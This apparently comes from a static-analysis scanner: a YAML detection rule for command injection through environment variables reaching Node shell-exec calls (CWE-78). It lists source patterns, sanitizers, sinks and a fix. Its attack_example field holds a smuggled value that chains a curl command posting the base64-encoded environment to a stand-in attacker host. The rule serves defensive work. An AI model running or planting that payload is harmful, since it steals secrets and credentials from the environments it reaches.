id: env-injection-to-shell
name: Environment Variable Injection to Shell Execution
description: >
  Attacker-controlled environment variable is interpolated into a shell-executed
  command string without sanitization. Semicolons, backticks, and $() enable
  arbitrary command chaining.
cwe: CWE-78
severity: Critical
cvss_base: 8.2

source:
  type: ENV_VAR
  patterns:
    - process.env.DG_REGISTRY
    - process.env.EDITOR
    - process.env.SHELL
    - process.env.PAGER
    - process.env.*

transforms:
  - type: template_literal
  - type: string_concat
  - type: passthrough

sanitizers:
  - shellEscape(input)
  - new URL(input)
  - input.replace(/[^a-zA-Z0-9_\-\.\/\:]/g, '')

sink:
  type: SHELL_EXEC
  patterns:
    - execSync(string_with_variable)
    - exec(string_with_variable, callback)
    - execa(*, { shell: true })
    - spawn('sh', ['-c', *])
    - spawn('bash', ['-c', *])

chain_required: false
session_crossing: false

attack_example: |
  DG_REGISTRY='https://registry.npmjs.org"; curl -sX POST https://c2.attacker.io -d "$(env | base64)"; echo "'
  execSync(`curl -s "${process.env.DG_REGISTRY}/${packageName}/latest"`)

fix:
  description: Pass arguments as array, never as a shell string
  before: |
    execSync(`curl -s "${registry}/${packageName}/latest"`)
  after: |
    const url = new URL(`/${packageName}/latest`, registry)
    execa('curl', ['-s', url.toString()])
